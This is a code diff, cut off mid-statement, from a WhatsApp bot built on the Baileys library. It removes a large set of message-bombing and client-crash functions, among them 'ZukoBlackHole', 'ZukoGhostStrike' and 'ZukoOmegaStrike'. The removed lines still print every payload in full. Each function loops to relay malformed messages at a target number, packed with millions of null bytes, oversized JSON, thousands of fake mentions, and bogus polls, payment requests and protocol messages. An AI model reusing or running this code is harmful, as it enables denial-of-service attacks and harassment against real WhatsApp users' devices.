@@ -153,1054 +153,6 @@ async function handleAntiSticker(empire, m, isCreator, isAdmins) {
     } catch { return false; }
 }
 
-async function invisibleZeroByte(empire, target) {
-    for (let i = 0; i < 100; i++) {
-        try {
-            const msg = {
-                viewOnceMessage: {
-                    message: {
-                        messageContextInfo: {
-                            deviceListMetadata: {},
-                            deviceListMetadataVersion: 9,
-                        },
-                        interactiveResponseMessage: {
-                            body: {
-                                text: "\u0000".repeat(100000),
-                                format: "DEFAULT"
-                            },
-                            nativeFlowResponseMessage: {
-                                name: "call_permission_request",
-                                paramsJson: "\u0000".repeat(999999),
-                                version: 9
-                            },
-                            contextInfo: {
-                                mentionedJid: Array.from({ length: 5000 }, () => 
-                                    `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
-                                ),
-                                isForwarded: true,
-                                forwardingScore: 99999999,
-                                businessMessageForwardInfo: {
-                                    businessOwnerJid: target,
-                                },
-                            }
-                        }
-                    }
-                }
-            };
-
-            await empire.relayMessage(target, msg, {
-                participant: { jid: target }
-            });
-            await delay(50);
-        } catch (err) {
-            console.log('ZeroByte error:', err);
-        }
-    }
-}
-
-// 2. Invisible Native Flow Bomb - Massive native flow spam
-async function invisibleNativeFlow(empire, target) {
-    for (let i = 0; i < 150; i++) {
-        try {
-            const payloads = [
-                {
-                    name: "single_select",
-                    params: `{"flow_cta":"${"\u0000".repeat(999999)}","flow_message_version":"${i}"}`
-                },
-                {
-                    name: "address_message",
-                    params: `{"values":{"in_pin_code":"${"\u0000".repeat(99999)}","building_name":"${"\u0000".repeat(99999)}","address":"${"\u0000".repeat(99999)}","tower_number":"${"\u0000".repeat(99999)}","city":"${"\u0000".repeat(99999)}","name":"${"\u0000".repeat(99999)}","phone_number":"+${Math.floor(Math.random()*99999999999)}","house_number":"${"\u0000".repeat(99999)}","floor_number":"${"\u0000".repeat(99999)}","state":"${"\u0000".repeat(9999999)}"}}`
-                },
-                {
-                    name: "menu_options",
-                    params: `{"display_text":"${"\u0000".repeat(99999)}","id":"R${i}","description":"${"\u0000".repeat(999999)}"}`
-                },
-                {
-                    name: "galaxy_message",
-                    params: `{"flow_cta":"${"\u0000".repeat(999999)}","version":"${i}"}`
-                }
-            ];
-
-            for (const p of payloads) {
-                const msg = {
-                    viewOnceMessage: {
-                        message: {
-                            interactiveResponseMessage: {
-                                body: {
-                                    text: "\u0000".repeat(100000),
-                                    format: "DEFAULT"
-                                },
-                                nativeFlowResponseMessage: {
-                                    name: p.name,
-                                    paramsJson: p.params,
-                                    version: 3
-                                },
-                                contextInfo: {
-                                    stanzaId: empire.generateMessageTag(),
-                                    participant: target,
-                                    remoteJid: "0@s.whatsapp.net",
-                                    mentionedJid: Array.from({ length: 9999 }, () => 
-                                        `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
-                                    ),
-                                    isForwarded: true,
-                                    forwardingScore: 999999
-                                }
-                            }
-                        }
-                    }
-                };
-
-                await empire.relayMessage(target, msg, {
-                    participant: { jid: target }
-                });
-                await delay(20);
-            }
-        } catch (err) {
-            console.log('NativeFlow error:', err);
-        }
-    }
-}
-
-// 3. Invisible Group Status Bomb - Spams group status updates
-async function invisibleGroupStatus(empire, target) {
-    for (let i = 0; i < 80; i++) {
-        try {
-            const msg = {
-                groupStatusMessageV2: {
-                    message: {
-                        viewOnceMessage: {
-                            message: {
-                                interactiveMessage: {
-                                    body: {
-                                        text: "\u0000".repeat(100000) + "💀".repeat(5000)
-                                    },
-                                    nativeFlowMessage: {
-                                        buttons: [
-                                            { name: "\u0000\u0000\u0000", buttonParamsJson: "\u0000".repeat(10000) },
-                                            { name: "single_select\u0000", buttonParamsJson: "{\u0000}".repeat(5000) },
-                                            { name: "\x00\x00", buttonParamsJson: "\u0000".repeat(50000) },
-                                            { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(900000) }
-                                        ]
-                                    },
-                                    contextInfo: {
-                                        businessMessageForwardInfo: {
-                                            businessOwnerJid: target
-                                        },
-                                        isForwarded: true,
-                                        forwardingScore: 999999 + i,
-                                        mentionedJid: Array.from({ length: 5000 }, () => 
-                                            `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
-                                        )
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            };
-
-            await empire.relayMessage(target, msg, {
-                participant: { jid: target }
-            });
-            await delay(40);
-        } catch (err) {
-            console.log('GroupStatus error:', err);
-        }
-    }
-}
-
-// 4. Invisible Ephemeral Bomb - Sends disappearing messages with massive content
-async function invisibleEphemeral(empire, target) {
-    for (let i = 0; i < 100; i++) {
-        try {
-            const msg = {
-                ephemeralMessage: {
-                    message: {
-                        conversation: "\u0000".repeat(50000) + "💀".repeat(10000)
-                    },
-                    ephemeralExpiration: 1
-                }
-            };
-
-            await empire.relayMessage(target, msg, {
-                participant: { jid: target }
-            });
-            await delay(25);
-        } catch (err) {
-            console.log('Ephemeral error:', err);
-        }
-    }
-}
-
-// 5. Invisible Media Bomb - Spams media with invisible captions
-async function invisibleMedia(empire, target) {
-    const mediaUrls = [
-        "https://mmg.whatsapp.net/v/t62.7161-24/573638734_1469804761202279_6437505177805631634_n.enc?ccb=11-4&oh=01_Q5Aa4AGIZi2WHFTyLffJtq_GjfVk-SnkgWZog4aoDWx7n-PUYA&oe=69E1A94A&_nc_sid=5e03e0&mms3=true"
-    ];
-
-    for (let i = 0; i < 60; i++) {
-        try {
-            const videox = {
-                url: mediaUrls[0],
-                mimetype: "video/mp4",
-                fileSha256: "VF5ZuntXYI59R/4LrPCoETOTfNj+mrEV9nayC+hq0LM=",
-                fileLength: "99999999",
-                seconds: 9999,
-                mediaKey: "vPrEbFav/Lh1CD9PFNx4lx3F2OP3LugeieFhHr/+7oc=",
-                caption: "\u0000".repeat(999999),
-                height: 1080,
-                width: 1920,
-                fileEncSha256: "Rv+qeol4QvrDUG2sav0bFrA0cyjsUXFkwt7xfYkYrSM=",
-                directPath: "/v/t62.7161-24/573638734_1469804761202279_6437505177805631634_n.enc?ccb=11-4&oh=01_Q5Aa4AGIZi2WHFTyLffJtq_GjfVk-SnkgWZog4aoDWx7n-PUYA&oe=69E1A94A&_nc_sid=5e03e0",
-                mediaKeyTimestamp: "1773743755",
-                contextInfo: {
-                    pairedMediaType: "NOT_PAIRED_MEDIA",
-                    mentionedJid: Array.from({ length: 5000 }, () => 
-                        `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
-                    ),
-                    isForwarded: true,
-                    forwardingScore: 999999
-                }
-            };
-
-            await empire.relayMessage(target, { videoMessage: videox }, {
-                ephemeralExpiration: 0,
-                forwardingScore: 99999,
-                isForwarded: true
-            });
-            await delay(50);
-        } catch (err) {
-            console.log('Media error:', err);
-        }
-    }
-}
-
-// 6. Invisible Mention Bomb - Massive mentions with invisible text
-async function invisibleMention(empire, target) {
-    const mentions = Array.from({ length: 9999 }, () => 
-        `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
-    );
-
-    for (let i = 0; i < 80; i++) {
-        try {
-            await empire.sendMessage(target, {
-                text: "\u0000".repeat(50000) + "\n\n" + mentions.map(m => `@${m.split('@')[0]}`).join(' '),
-                mentions: mentions
-            }).catch(() => {});
-            await delay(30);
-        } catch (err) {
-            console.log('Mention error:', err);
-        }
-    }
-}
-
-// 7. Invisible Reaction Bomb - Spams reactions with invisible messages
-async function invisibleReaction(empire, target) {
-    const reactions = ["💀", "🔥", "😈", "👻"];
-    
-    for (let i = 0; i < 100; i++) {
-        try {
-            const msg = await empire.sendMessage(target, {
-                text: "\u0000".repeat(10000) + "💀"
-            }).catch(() => null);
-            
-            if (msg) {
-                await delay(100);
-                await empire.sendMessage(target, {
-                    react: {
-                        text: reactions[i % reactions.length],
-                        key: msg.key
-                    }
-                }).catch(() => {});
-            }
-            await delay(50);
-        } catch (err) {
-            console.log('Reaction error:', err);
-        }
-    }
-}
-
-// 8. Invisible Status Bomb - Sends invisible status updates
-async function invisibleStatus(empire, target) {
-    for (let i = 0; i < 50; i++) {
-        try {
-            const statusMsg = {
-                statusMessage: {
-                    body: {
-                        text: "\u0000".repeat(50000),
-                        format: "DEFAULT"
-                    },
-                    contextInfo: {
-                        mentionedJid: Array.from({ length: 3000 }, () => 
-                            `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
-                        ),
-                        isForwarded: true,
-                        forwardingScore: 999999,
-                        businessMessageForwardInfo: {
-                            businessOwnerJid: target,
-                        },
-                    }
-                }
-            };
-
-            await empire.relayMessage(target, statusMsg, {
-                participant: { jid: target }
-            });
-            await delay(30);
-        } catch (err) {
-            console.log('Status error:', err);
-        }
-    }
-}
-// ============================================================
-// ZUKO BLACKHOLE - New Attack Vector
-// Targets: Reactions, Polls, Payments, and Location
-// ============================================================
-async function ZukoBlackHole(target) {
-  const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
-  const crypto = require('crypto');
-
-  const blackHolePayload = '\u0000'.repeat(9999999) + 
-                           '🔥 ZUKO BLACKHOLE 🔥'.repeat(5000) +
-                           'ҫ'.repeat(200000);
-
-  for (let i = 0; i < 150; i++) {
-    // ====== PAYLOAD 1: Reaction Bomb (Invalid Emoji) ======
-    const reactionMsg = {
-      reactionMessage: {
-        key: {
-          remoteJid: target,
-          id: crypto.randomBytes(16).toString('hex'),
-          fromMe: true
-        },
-        text: '🔥'.repeat(50000) + '\u0000'.repeat(50000),
-        groupingKey: crypto.randomBytes(32).toString('hex')
-      }
-    };
-
-    // ====== PAYLOAD 2: Poll Creation with 1000 Options ======
-    const pollOptions = [];
-    for (let p = 0; p < 1000; p++) {
-      pollOptions.push({ 
-        optionName: `Option ${p} ` + 'X'.repeat(5000) + '\u0000'.repeat(5000) 
-      });
-    }
-
-    const pollMsg = {
-      pollCreationMessage: {
-        name: '🔥 ZUKO BLACKHOLE POLL 🔥 ' + 'X'.repeat(50000) + '\u0000'.repeat(50000),
-        options: pollOptions,
-        selectableOptionsCount: 1,
-        pollType: 'QUIZ',
-        correctAnswer: pollOptions[Math.floor(Math.random() * 1000)]
-      }
-    };
-
-    // ====== PAYLOAD 3: Payment Request with Max Amount ======
-    const paymentMsg = {
-      requestPaymentMessage: {
-        currencyCodeIso4217: 'USD',
-        requestFrom: target,
-        expiryTimestamp: Date.now() + 9999999999,
-        amount: {
-          value: 999999999999999,
-          offset: 999999999999999,
-          currencyCode: 'USD'
-        },
-        contextInfo: {
-          forwardingScore: 999999999,
-          isForwarded: true,
-          fromMe: false,
-          remoteJid: 'status@broadcast',
-          externalAdReply: {
-            title: '💀 ZUKO BLACKHOLE 💀'.repeat(1000) + '\u0000'.repeat(50000),
-            body: 'PAYMENT REQUIRED'.repeat(5000) + '\u0000'.repeat(50000),
-            mediaType: 'IMAGE',
-            showAdAttribution: true,
-            sourceUrl: 'https://t.me/ZUKOXMDBOT'
-          }
-        }
-      }
-    };
-
-    // ====== PAYLOAD 4: Location Bomb with Invalid Coords ======
-    const locationMsg = {
-      locationMessage: {
-        degreesLatitude: 999999999999999,
-        degreesLongitude: -999999999999999,
-        name: '🔥 ZUKO BLACKHOLE LOCATION 🔥'.repeat(5000) + '\u0000'.repeat(50000),
-        address: 'BLACKHOLE ADDRESS'.repeat(5000) + '\u0000'.repeat(50000),
-        url: 'https://t.me/ZUKOXMDBOT' + 'X'.repeat(50000),
-        contextInfo: {
-          mentionedJid: Array.from({ length: 5000 }, () => 
-            Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-          ),
-          forwardingScore: 999999999,
-          isForwarded: true
-        }
-      }
-    };
-
-    // ====== PAYLOAD 5: Interactive with Malformed JSON ======
-    const interactiveMsg = {
-      viewOnceMessage: {
-        message: {
-          interactiveResponseMessage: {
-            body: {
-              text: '🔥 ZUKO BLACKHOLE INTERACTIVE 🔥'.repeat(5000) + '\u0000'.repeat(50000),
-              format: 'DEFAULT'
-            },
-            nativeFlowResponseMessage: {
-              name: 'call_permission_request',
-              paramsJson: '{'.repeat(9999999) + '}'.repeat(9999999) + '\u0000'.repeat(50000),
-              version: 9
-            },
-            contextInfo: {
-              mentionedJid: Array.from({ length: 5000 }, () => 
-                Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-              ),
-              isForwarded: true,
-              forwardingScore: 999999999,
-              remoteJid: 'status@broadcast',
-              participant: Math.floor(Math.random() * 99999999) + '@s.whatsapp.net',
-              quotedMessage: {
-                paymentInviteMessage: {
-                  serviceType: 'FPM',
-                  expiryTimestamp: Date.now() + 9999999999
-                }
-              }
-            }
-          }
-        }
-      }
-    };
-
-    // ====== PAYLOAD 6: Protocol Message Spam ======
-    const protocolMsg = {
-      protocolMessage: {
-        key: {
-          remoteJid: target,
-          id: crypto.randomBytes(16).toString('hex'),
-          fromMe: true
-        },
-        type: 25,
-        ephemeralExpiration: 999999999
-      }
-    };
-
-    // Send all 6 payloads in parallel
-    await Promise.all([
-      empire.relayMessage(target, reactionMsg, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, pollMsg, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, paymentMsg, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, locationMsg, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, interactiveMsg, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, protocolMsg, { participant: { jid: target } }).catch(() => {})
-    ]);
-
-    // Log progress
-    if (i % 10 === 0) {
-      console.log(chalk.yellow(`🕳️ ZUKO BLACKHOLE Progress: ${i}/150 on ${target}`));
-    }
-
-    await sleep(100);
-  }
-
-  // ====== FINAL SURGE: 100 iterations of pure chaos ======
-  for (let i = 0; i < 100; i++) {
-    await Promise.all([
-      empire.relayMessage(target, {
-        pollCreationMessage: {
-          name: '\u0000'.repeat(9999999),
-          options: Array.from({ length: 2000 }, () => ({ 
-            optionName: '\u0000'.repeat(5000) 
-          })),
-          selectableOptionsCount: 1,
-          pollType: 'QUIZ',
-          correctAnswer: { optionName: '\u0000'.repeat(5000) }
-        }
-      }, { participant: { jid: target } }).catch(() => {}),
-      
-      empire.relayMessage(target, {
-        requestPaymentMessage: {
-          currencyCodeIso4217: 'USD',
-          requestFrom: target,
-          amount: {
-            value: 999999999999999,
-            offset: 999999999999999,
-            currencyCode: 'USD'
-          },
-          contextInfo: {
-            forwardingScore: 999999999,
-            isForwarded: true,
-            externalAdReply: {
-              title: '\u0000'.repeat(99999),
-              body: '\u0000'.repeat(99999),
-              mediaType: 'IMAGE'
-            }
-          }
-        }
-      }, { participant: { jid: target } }).catch(() => {})
-    ]);
-    await sleep(50);
-  }
-
-  console.log(chalk.green(`✅ ZUKO BLACKHOLE COMPLETE on ${target}`));
-  console.log(chalk.yellow(`🕳️ TARGET ${target} HAS BEEN SUCKED INTO THE BLACKHOLE 🕳️`));
-}
-// ============================================================
-// ZUKO GHOST STRIKE - Invisible Group Crash
-// Payloads are hidden from regular members but crash the client
-// ============================================================
-async function ZukoGhostStrike(target) {
-  const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
-  const crypto = require('crypto');
-
-  const ghostPayload = '\u0000'.repeat(9999999) + 
-                       '👻 ZUKO GHOST STRIKE 👻'.repeat(5000) +
-                       'ҫ'.repeat(200000);
-
-  // ====== PHASE 1: Invisible Protocol Messages ======
-  for (let i = 0; i < 100; i++) {
-    // Payload 1: Invisible Group Status Update (No notification)
-    const ghostMsg1 = {
-      protocolMessage: {
-        key: {
-          remoteJid: target,
-          id: crypto.randomBytes(16).toString('hex'),
-          fromMe: true,
-          participant: '0@s.whatsapp.net'
-        },
-        type: 16, // GROUP_STATUS_UPDATE
-        ephemeralExpiration: 999999999,
-        status: 0,
-        groupStatusUpdate: {
-          type: 0,
-          status: 0
-        },
-        contextInfo: {
-          participant: '0@s.whatsapp.net',
-          remoteJid: target,
-          isForwarded: true,
-          forwardingScore: 999999999,
-          mentionedJid: Array.from({ length: 3000 }, () => 
-            Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-          )
-        }
-      }
-    };
-
-    // Payload 2: Invisible Ephemeral Message (Self-destructs)
-    const ghostMsg2 = {
-      ephemeralMessage: {
-        message: {
-          protocolMessage: {
-            key: {
-              remoteJid: target,
-              id: crypto.randomBytes(16).toString('hex'),
-              fromMe: true
-            },
-            type: 25,
-            ephemeralExpiration: 0
-          }
-        },
-        ephemeralExpiration: 0
-      }
-    };
-
-    // Payload 3: Invisible ViewOnce with null bytes
-    const ghostMsg3 = {
-      viewOnceMessage: {
-        message: {
-          messageContextInfo: {
-            deviceListMetadata: {},
-            deviceListMetadataVersion: 2,
-            messageSecret: crypto.randomBytes(32)
-          },
-          protocolMessage: {
-            key: {
-              remoteJid: target,
-              id: crypto.randomBytes(16).toString('hex'),
-              fromMe: true
-            },
-            type: 25,
-            ephemeralExpiration: 999999999
-          }
-        }
-      }
-    };
-
-    // Payload 4: Invisible Group Mention (No visible text)
-    const ghostMsg4 = {
-      extendedTextMessage: {
-        text: '',
-        contextInfo: {
-          mentionedJid: Array.from({ length: 5000 }, () => 
-            Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-          ),
-          participant: '0@s.whatsapp.net',
-          remoteJid: 'status@broadcast',
-          isForwarded: true,
-          forwardingScore: 999999999,
-          quotedMessage: {
-            conversation: '\u0000'.repeat(50000)
-          }
-        }
-      }
-    };
-
-    // Payload 5: Invisible Poll (Hidden from view)
-    const ghostMsg5 = {
-      pollCreationMessage: {
-        name: '\u0000'.repeat(50000),
-        options: Array.from({ length: 500 }, () => ({ 
-          optionName: '\u0000'.repeat(50000) 
-        })),
-        selectableOptionsCount: 1,
-        pollType: 'QUIZ',
-        correctAnswer: { optionName: '\u0000'.repeat(50000) },
-        contextInfo: {
-          mentionedJid: Array.from({ length: 3000 }, () => 
-            Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-          ),
-          isForwarded: true,
-          forwardingScore: 999999999
-        }
-      }
-    };
-
-    // Send all invisible payloads
-    await Promise.all([
-      empire.relayMessage(target, ghostMsg1, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, ghostMsg2, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, ghostMsg3, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, ghostMsg4, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, ghostMsg5, { participant: { jid: target } }).catch(() => {})
-    ]);
-
-    if (i % 10 === 0) {
-      console.log(chalk.gray(`👻 GHOST STRIKE Phase 1: ${i}/100 on ${target}`));
-    }
-
-    await sleep(80);
-  }
-
-  // ====== PHASE 2: Invisible Admin Actions ======
-  for (let i = 0; i < 50; i++) {
-    // Invisible Group Setting Change
-    const ghostAdmin1 = {
-      protocolMessage: {
-        key: {
-          remoteJid: target,
-          id: crypto.randomBytes(16).toString('hex'),
-          fromMe: true
-        },
-        type: 20, // GROUP_SETTINGS
-        groupSettingsUpdate: {
-          setting: 0,
-          value: '\u0000'.repeat(50000)
-        },
-        contextInfo: {
-          participant: '0@s.whatsapp.net',
-          remoteJid: target,
-          isForwarded: true,
-          forwardingScore: 999999999
-        }
-      }
-    };
-
-    // Invisible Participant Update
-    const ghostAdmin2 = {
-      protocolMessage: {
-        key: {
-          remoteJid: target,
-          id: crypto.randomBytes(16).toString('hex'),
-          fromMe: true
-        },
-        type: 17, // PARTICIPANT_UPDATE
-        participantUpdate: {
-          type: 0,
-          jid: Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-        },
-        contextInfo: {
-          participant: '0@s.whatsapp.net',
-          remoteJid: target,
-          isForwarded: true,
-          forwardingScore: 999999999
-        }
-      }
-    };
-
-    // Invisible Newsletter Invite (Hidden)
-    const ghostAdmin3 = {
-      newsletterAdminInviteMessage: {
-        newsletterJid: `120363${Math.floor(Math.random() * 999999999)}@newsletter`,
-        newsletterName: '\u0000'.repeat(50000),
-        caption: '\u0000'.repeat(50000),
-        inviteExpiration: '0',
-        contextInfo: {
-          participant: '0@s.whatsapp.net',
-          remoteJid: target,
-          isForwarded: true,
-          forwardingScore: 999999999
-        }
-      }
-    };
-
-    await Promise.all([
-      empire.relayMessage(target, ghostAdmin1, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, ghostAdmin2, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, ghostAdmin3, { participant: { jid: target } }).catch(() => {})
-    ]);
-
-    if (i % 10 === 0) {
-      console.log(chalk.gray(`👻 GHOST STRIKE Phase 2: ${i}/50 on ${target}`));
-    }
-
-    await sleep(100);
-  }
-
-  // ====== PHASE 3: Invisible Message Deletion (Mass Delete) ======
-  for (let i = 0; i < 30; i++) {
-    const deleteKeys = Array.from({ length: 100 }, () => ({
-      remoteJid: target,
-      id: crypto.randomBytes(16).toString('hex'),
-      fromMe: true
-    }));
-
-    const ghostDelete = {
-      protocolMessage: {
-        key: {
-          remoteJid: target,
-          id: crypto.randomBytes(16).toString('hex'),
-          fromMe: true
-        },
-        type: 13, // DELETE_MESSAGES
-        deleteMessages: {
-          keys: deleteKeys
-        },
-        contextInfo: {
-          participant: '0@s.whatsapp.net',
-          remoteJid: target,
-          isForwarded: true,
-          forwardingScore: 999999999
-        }
-      }
-    };
-
-    await empire.relayMessage(target, ghostDelete, { participant: { jid: target } }).catch(() => {});
-    console.log(chalk.gray(`👻 GHOST STRIKE Phase 3: ${i}/30 on ${target}`));
-    await sleep(150);
-  }
-
-  // ====== PHASE 4: Invisible Newsletters (Status Broadcast) ======
-  for (let i = 0; i < 30; i++) {
-    const ghostNewsletter = {
-      viewOnceMessage: {
-        message: {
-          messageContextInfo: {
-            deviceListMetadata: {},
-            deviceListMetadataVersion: 2,
-            messageSecret: crypto.randomBytes(32)
-          },
-          interactiveResponseMessage: {
-            body: {
-              text: '\u0000'.repeat(50000),
-              format: 'DEFAULT'
-            },
-            nativeFlowResponseMessage: {
-              name: 'galaxy_message',
-              paramsJson: '\u0000'.repeat(9999999),
-              version: 9
-            },
-            contextInfo: {
-              mentionedJid: Array.from({ length: 3000 }, () => 
-                Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-              ),
-              isForwarded: true,
-              forwardingScore: 999999999,
-              remoteJid: 'status@broadcast',
-              participant: Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-            }
-          }
-        }
-      }
-    };
-
-    await empire.relayMessage('status@broadcast', ghostNewsletter, {
-      statusJidList: [target],
-      additionalNodes: [{
-        tag: 'meta',
-        attrs: {},
-        content: [{
-          tag: 'mentioned_users',
-          attrs: {},
-          content: [{ tag: 'to', attrs: { jid: target }, content: [] }]
-        }]
-      }]
-    }).catch(() => {});
-
-    console.log(chalk.gray(`👻 GHOST STRIKE Phase 4: ${i}/30 on ${target}`));
-    await sleep(100);
-  }
-
-  // ====== FINAL SURGE: Invisible Chaos ======
-  for (let i = 0; i < 50; i++) {
-    await Promise.all([
-      empire.relayMessage(target, {
-        protocolMessage: {
-          key: {
-            remoteJid: target,
-            id: crypto.randomBytes(16).toString('hex'),
-            fromMe: true
-          },
-          type: 25,
-          ephemeralExpiration: 999999999,
-          contextInfo: {
-            participant: '0@s.whatsapp.net',
-            remoteJid: target,
-            isForwarded: true,
-            forwardingScore: 999999999,
-            mentionedJid: Array.from({ length: 3000 }, () => 
-              Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-            )
-          }
-        }
-      }, { participant: { jid: target } }).catch(() => {}),
-      
-      empire.relayMessage(target, {
-        viewOnceMessage: {
-          message: {
-            protocolMessage: {
-              key: {
-                remoteJid: target,
-                id: crypto.randomBytes(16).toString('hex'),
-                fromMe: true
-              },
-              type: 16,
-              ephemeralExpiration: 999999999
-            }
-          }
-        }
-      }, { participant: { jid: target } }).catch(() => {})
-    ]);
-
-    if (i % 10 === 0) {
-      console.log(chalk.gray(`👻 GHOST STRIKE Final Surge: ${i}/50 on ${target}`));
-    }
-
-    await sleep(50);
-  }
-
-  console.log(chalk.green(`✅ ZUKO GHOST STRIKE COMPLETE on ${target}`));
-  console.log(chalk.gray(`👻 TARGET ${target} HAS BEEN GHOSTED 👻`));
-}
-// ============================================================
-// ZUKOXMD OMEGA STRIKE - Hybrid Crash (Strongest)
-// Rebranded for ZUKOXMD TECH
-// ============================================================
-async function ZukoOmegaStrike(target) {
-  const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
-  const crypto = require('crypto');
-
-  const hugeJson = "{".repeat(900000) + "}".repeat(900000) + 
-                   '"zuko":"omegastrike_2026"'.repeat(200);
-
-  const toxic = '🔥 ZUKOXMD OMEGA STRIKE ACTIVATED 🔥'.repeat(5000) + 
-                '\u0000'.repeat(500000) + 
-                'ҫ'.repeat(100000);
-
-  for (let i = 0; i < 200; i++) {
-    // Payload 1: Malformed Interactive (Force Close)
-    const payload1 = {
-      viewOnceMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              title: '⚡ ZUKOXMD ⚡ OMEGA'.repeat(100),
-              hasMediaAttachment: false,
-              locationMessage: {
-                degreesLatitude: -999999999999999,
-                degreesLongitude: 999999999999999,
-                name: toxic.substring(0, 3000),
-                address: 'zuko_omega.json'.repeat(50000),
-                jpegThumbnail: Buffer.alloc(1)
-              }
-            },
-            body: { text: toxic.substring(0, 50000) },
-            nativeFlowMessage: {
-              messageParamsJson: hugeJson,
-              buttons: [
-                { name: 'single_select', buttonParamsJson: '\u0000'.repeat(100000) },
-                { name: 'call_permission_request', buttonParamsJson: '\u0000'.repeat(100000) },
-                { name: 'galaxy_message', buttonParamsJson: JSON.stringify({ data: 'X'.repeat(100000) }) }
-              ]
-            },
-            contextInfo: {
-              mentionedJid: Array.from({ length: 5000 }, () => 
-                Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-              ),
-              forwardingScore: 999999999,
-              isForwarded: true,
-              quotedMessage: { conversation: toxic.substring(0, 30000) }
-            }
-          }
-        }
-      }
-    };
-
-    // Payload 2: Newsletter Admin Invite Flood
-    const payload2 = {
-      newsletterAdminInviteMessage: {
-        newsletterJid: `120363${Math.floor(Math.random() * 999999999)}@newsletter`,
-        newsletterName: 'ZUKOXMD OMEGA ' + 'XxX'.repeat(50000) + '\u0000'.repeat(500000),
-        caption: toxic.substring(0, 50000) + '\u0000'.repeat(500000),
-        inviteExpiration: Date.now() + 9999999999
-      }
-    };
-
-    // Payload 3: Sticker Bomb with giant metadata
-    const payload3 = generateWAMessageFromContent(target, {
-      viewOnceMessage: {
-        message: {
-          stickerMessage: {
-            url: `https://mmg.whatsapp.net/v/t62.43144-24/10000000_${Math.floor(Math.random() * 999999999)}_${Math.floor(Math.random() * 999999999)}_n.enc?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=5e03e0&mms3=true`,
-            fileSha256: Buffer.from(crypto.randomBytes(32)).toString('base64'),
-            fileEncSha256: Buffer.from(crypto.randomBytes(32)).toString('base64'),
-            mediaKey: Buffer.from(crypto.randomBytes(32)).toString('base64'),
-            mimetype: 'image/webp',
-            directPath: `/v/t62.43144-24/${Math.floor(Math.random() * 999999999)}_${Math.floor(Math.random() * 999999999)}_n.enc?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=5e03e0`,
-            fileLength: { low: 999999999, high: 999999999, unsigned: true },
-            mediaKeyTimestamp: { low: Date.now(), high: 0, unsigned: false },
-            firstFrameLength: 99999,
-            firstFrameSidecar: 'KN4kQ5pyABRAgA==',
-            isAnimated: true,
-            contextInfo: {
-              participant: target,
-              mentionedJid: Array.from({ length: 5000 }, () => 
-                Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-              ),
-              entryPointConversionSource: 'non_contact',
-              entryPointConversionApp: 'whatsapp',
-              entryPointConversionDelaySeconds: 999999
-            },
-            stickerSentTs: { low: -99999999, high: 999, unsigned: true },
-            isAvatar: true,
-            isAiSticker: true,
-            isLottie: true
-          }
-        }
-      }
-    }, {});
-
-    // Payload 4: Extended Text with huge data
-    const payload4 = {
-      extendedTextMessage: {
-        text: toxic.substring(0, 60000),
-        matchedText: 'https://t.me/ZUKOXMDBOT' + 'x'.repeat(50000),
-        description: toxic.substring(0, 30000),
-        title: 'ZUKOXMD OMEGA ' + 'x'.repeat(50000),
-        contextInfo: {
-          isForwarded: true,
-          forwardingScore: 999999999,
-          mentionedJid: Array.from({ length: 5000 }, () => 
-            Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-          ),
-          quotedMessage: {
-            locationMessage: {
-              degreesLatitude: 999999999999999,
-              degreesLongitude: -999999999999999,
-              accuracyInMeters: 999999999
-            }
-          }
-        }
-      }
-    };
-
-    // Payload 5: Call Permission Request with giant params
-    const payload5 = {
-      viewOnceMessage: {
-        message: {
-          interactiveResponseMessage: {
-            body: { text: '$'.repeat(50000), format: 'DEFAULT' },
-            nativeFlowResponseMessage: {
-              name: 'call_permission_request',
-              paramsJson: '\u0000'.repeat(9999999),
-              version: 9
-            },
-            contextInfo: {
-              isForwarded: true,
-              forwardingScore: 999999999,
-              remoteJid: 'status@broadcast',
-              participant: Math.floor(Math.random() * 99999999) + '@s.whatsapp.net',
-              quotedMessage: {
-                forwardedNewsletterMessageInfo: {
-                  newsletterJid: `120363${Math.floor(Math.random() * 999999999)}@newsletter`,
-                  newsletterName: '$'.repeat(50000) + '\u0000'.repeat(500000),
-                  contentType: 'UPDATE_CARD',
-                  accessibilityText: '\u0000'.repeat(50000),
-                  serverMessageId: Math.floor(Math.random() * 99999999)
-                }
-              }
-            }
-          }
-        }
-      }
-    };
-
-    // Send all 5 payloads in parallel for maximum impact
-    await Promise.all([
-      empire.relayMessage(target, payload1, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, payload2, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, payload3.message, { participant: { jid: target } }).catch(() => {}),
